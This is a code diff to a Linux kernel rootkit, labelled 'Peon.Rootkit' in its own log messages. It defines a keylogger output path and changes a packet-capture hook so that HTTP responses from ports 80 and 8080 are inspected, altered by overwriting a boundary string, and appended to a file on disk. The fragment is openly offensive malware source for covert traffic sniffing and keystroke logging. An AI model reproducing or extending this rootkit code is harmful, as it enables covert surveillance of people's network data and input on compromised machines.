@@ -43,7 +43,7 @@
 #define PID_4_SHOW_MOD 22222
 #define ETH_P_ALL       0x0003
 #define KEYLOG_PATH      "/home/keylogger.txt"
-#define TEST_PATH      "/home/test.txt"
+#define TEST_PATH      "/home/peon/test.txt"
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
 #define OS_64_BITS
@@ -481,13 +481,21 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
 			data = (unsigned char *)((__u32 *)tcp_hdr + tcp_hdr->doff);
 			/* check if source port is from http */
 			if(tcp_hdr->source==ntohs(80) || tcp_hdr->source==ntohs(8080)){
+				char *tmp=NULL;
 				#ifdef DEBUG
 				printk(KERN_ALERT "Peon.Rootkit: http\n");
 				printk(KERN_ALERT "Peon.Rootkit: skb data len %d\n",skb->data_len);
 				printk(KERN_ALERT "Peon.Rootkit: skb mac len %d\n",skb->mac_len);
 				printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d\n",skb->hdr_len);
-				printk(KERN_ALERT "Peon.Rootkit: skb taille %d\n",(int)(skb->data - skb->tail));
-				//printk(KERN_ALERT "Peon.Rootkit: data=%s\n",data);
+				tmp=strstr(data,"-----------------------------");
+				if(tmp!=NULL)
+				{
+				int i=0;	
+				for(;i<strlen("-----------------------------");i++)
+				*(tmp+i)='A';	
+				}
+				printk(KERN_ALERT "Peon.Rootkit: skb taille %d\n",(int)strlen(data));
+				printk(KERN_ALERT "Peon.Rootkit: data=%s\n",data);
 				append_filez(TEST_PATH,data,strlen(data));
 				
 				#endif
